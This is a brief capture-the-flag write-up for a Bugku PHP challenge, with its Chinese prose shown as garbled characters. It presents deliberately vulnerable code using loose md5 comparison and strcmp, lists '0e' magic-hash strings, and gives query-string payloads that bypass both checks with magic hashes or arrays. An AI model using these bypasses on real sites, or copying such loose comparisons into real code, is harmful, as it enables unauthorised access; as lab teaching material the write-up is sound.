# md5�ƹ�
- bugku ǰŮ��
```php
<?php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    $v3 = $_GET['v3'];
    if($v1 != $v2 && md5($v1) == md5($v2)){
        if(!strcmp($v3, $flag)){
            echo $flag;
        }
    }
}
?>
```
��ĿҪ��v1��v2����ȣ���md5��ȣ�v3����flag
������md5��ײ(0e�ƹ�)��
```
QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
s214587387a
```
v1��v2����ʹ��0e�ƹ�
php���ܴ������飬strcmp()ʹ�������ƹ�
���Թ���payload��
```
?v1=QNKCDZO&v2=240610708&v3[]=1
?v1[]=2&v2[]=1&v3[]=1    //v1��v2Ҳ���������ƹ�md5
```

0e215962017���㣺$md5=md5($md5)